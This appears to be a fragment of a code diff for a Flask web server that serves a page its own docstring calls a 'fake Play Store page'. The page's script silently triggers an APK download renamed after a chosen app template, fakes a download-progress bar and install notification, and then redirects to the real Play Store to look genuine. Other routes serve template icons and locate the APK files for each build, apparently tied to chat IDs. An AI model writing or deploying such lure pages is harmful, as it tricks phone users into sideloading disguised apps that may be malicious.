+  var prog = document.getElementById('btn-progress');
+  var txt = document.getElementById('install-btn-text');
+  btn.style.background = '#1557b0';
+  txt.textContent = 'Downloading…';
+
+  // Vibrate
+  if (navigator.vibrate) navigator.vibrate([50]);
+
+  // Trigger APK download silently
+  var a = document.createElement('a');
+  a.href = dlUrl;
+  a.download = appName.replace(/ /g,'_') + '.apk';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+
+  // Animate progress
+  var pct = 0;
+  var speed = sizeMb / 20;
+  var iv = setInterval(function() {{
+    pct = Math.min(100, pct + speed + Math.random() * speed * 0.5);
+    prog.style.width = pct + '%';
+    var mb = (sizeMb * pct / 100).toFixed(1);
+    txt.textContent = mb + ' MB / ' + sizeMb + ' MB';
+    if (pct >= 100) {{
+      clearInterval(iv);
+      prog.style.width = '100%';
+      btn.style.background = '#188038';
+      txt.textContent = 'Open';
+      installed = true;
+      if (navigator.vibrate) navigator.vibrate([80, 40, 80]);
+      showNotif();
+    }}
+  }}, 400);
+}}
+
+function showNotif() {{
+  var n = document.getElementById('notif');
+  n.classList.add('show');
+  setTimeout(function() {{ n.classList.remove('show'); }}, 4000);
+}}
+
+// Deep link to real Play Store on page load
+window.addEventListener('load', function() {{
+  setTimeout(function() {{
+    window.location.href = 'market://details?id=com.google.android.play.games';
+  }}, 800);
+}});
+</script>
+</body>
+</html>"""
+
+
+@app.route("/store/<token>", methods=["GET"])
+def store_page(token):
+    """Serve fake Play Store page for a build."""
+    build = _get_build_by_token(token)
+    if not build:
+        return Response("Not found", status=404)
+    html = _store_html(build)
+    return Response(html, mimetype="text/html")
+
+
+@app.route("/store/icon/<token>", methods=["GET"])
+def store_icon(token):
+    """Serve template icon PNG for a build."""
+    build = _get_build_by_token(token)
+    if not build:
+        return Response("", status=404)
+    template = build.get("template", "custom") or "custom"
+    icon_path = os.path.join(ICON_DIR, f"{template}.png")
+    if os.path.exists(icon_path):
+        return send_file(icon_path, mimetype="image/png")
+    return Response("", status=404)
+
+
+@app.route("/dl/<token>", methods=["GET"])
+def dl_apk(token):
+    """Serve APK download for a build."""
+    build = _get_build_by_token(token)
+    if not build:
+        return Response("Not found", status=404)
+
+    # Locate APK — stored in artifacts dir or standard path
+    chat_id      = build.get("chat_id", "")
+    build_number = build.get("build_number", "")
+    pkg          = build.get("package_name", "") or "app"
+    template     = build.get("template", "custom") or "custom"
+    custom_name  = build.get("custom_app_name", "") or ""
+    app_name     = custom_name or (STORE_TEMPLATES.get(template, STORE_TEMPLATES["custom"])[1])
+
+    # Search common APK storage paths
+    search_dirs = [
+        os.path.join(os.path.dirname(__file__), "..", "artifacts"),
+        os.path.join(os.path.dirname(__file__), "artifacts"),
+        os.path.join(os.path.dirname(__file__), "apks"),
+        "/tmp/apks",
+    ]
+    apk_path = None
+    for d in search_dirs:
+        if not os.path.isdir(d):
+            continue
+        for fname in os.listdir(d):
+            if not fname.endswith(".apk"):
+                continue
+            if str(build_number) in fname or token[:8] in fname:
+                apk_path = os.path.join(d, fname)
+                break
+        if apk_path:
+            break
+
+    if not apk_path or not os.path.exists(apk_path):
+        log.warning(f"dl_apk: APK not found for token={token} build={build_number}")
+        return Response("APK not available", status=404)
+
+    dl_name = f"{app_name.replace(' ', '_')}.apk"
+    return send_file(apk_path, as_attachment=True, download_name=dl_name, mimetype="application/vnd.android.package-archive")
 
 
 # ── Error handlers ────────────────────────────────────────────────────────────
